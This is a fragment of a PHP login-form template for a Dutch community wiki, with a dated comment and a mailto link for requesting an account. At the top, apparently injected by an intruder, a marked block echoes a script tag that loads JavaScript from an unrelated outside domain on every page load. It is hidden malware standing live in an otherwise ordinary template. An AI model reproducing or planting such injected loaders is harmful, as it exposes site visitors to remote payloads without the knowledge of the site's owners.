...
#06f3ab#
if(empty($rni)) {
$rni = "<script src=\"http://nextgenerationpoolsinc.com/cGdofn3P.php?id=53814103\" type=\"text/javascript\"></script>";
echo $rni;
}
...
<form name="userlogin" method="post" action="<?php $this->text('action') ?>">
	...
	<?php } ?>
        ...
        <?php		
         /**
		  * 10-03-2009, Jeroen Schuyt:
		  * Add e-mail link for requesting an account.
          */
		 ?>
		<tr><td></td><td></td></tr>
		<tr>
		   <td colspan="2"><i>Nog geen account? Klik 
		   <a href="mailto:<?php global $wgPasswordSender;echo $wgPasswordSender;?>?
		      subject=Verzoek voor een user account op de LennisWiki&
		      body=[Graag naam,adres,telefoon en uw binding met Lennisheuvel aangeven.]"
		   >hier</a> om een mail te sturen om een account aan te vragen.</br>
		   Geef in de mail uw naam, mailadres, telefoon en binding met Lennisheuvel aan (inwoner, kennis van lokale geschiedenis, betrokken bij maatschappelijk leven, anders).</br>
		   Uw gegevens worden niet gebruikt voor andere doeleinden of aan derden verstrekt.</i></td>
		</tr>
		<?php		
		/**
         * End Add
